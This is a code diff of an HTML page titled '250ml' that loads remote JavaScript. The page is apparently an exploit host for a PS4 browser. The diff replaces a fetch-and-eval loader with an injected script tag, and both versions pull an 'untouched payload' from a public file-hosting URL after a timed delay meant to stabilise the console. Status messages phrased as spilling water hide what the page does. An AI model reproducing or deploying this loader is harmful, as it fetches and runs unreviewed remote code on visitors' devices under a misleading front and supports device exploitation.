@@ -5,22 +5,21 @@
   <title>250ml</title>
   <link rel="stylesheet" href="style250.css" />
   <script>
-  fetch("https://files.catbox.moe/cwedrd.js")
-    .then(res => res.text())
-    .then(code => {
-      document.getElementById("status").textContent = "Spilling water...";
-      setTimeout(() => {
-        try {
-          eval(code); // Full file executes after brief delay
-          document.getElementById("status").textContent = "Water spilled!";
-        } catch (err) {
-          document.getElementById("status").textContent = "Not spilled: " + err.message;
-        }
-      }, 1500); // Allows garbage collection, event loop stabilization
-    })
-    .catch(err => {
-      document.getElementById("status").textContent = "Glass not filled: " + err.message;
-    });
+  setTimeout(() => {
+    const script = document.createElement('script');
+    script.src = 'https://files.catbox.moe/cwedrd.js'; // untouched payload
+    script.defer = true; // helps browser postpone execution
+
+    script.onload = () => {
+      document.getElementById("status").textContent = "Spilling water unless system frozen...";
+    };
+
+    script.onerror = () => {
+      document.getElementById("status").textContent = "Bottle not filled.";
+    };
+
+    document.head.appendChild(script);
+  }, 1500); // Delay to let PS4 settle GC and flush buffers
 </script>
 </head>
 <body>
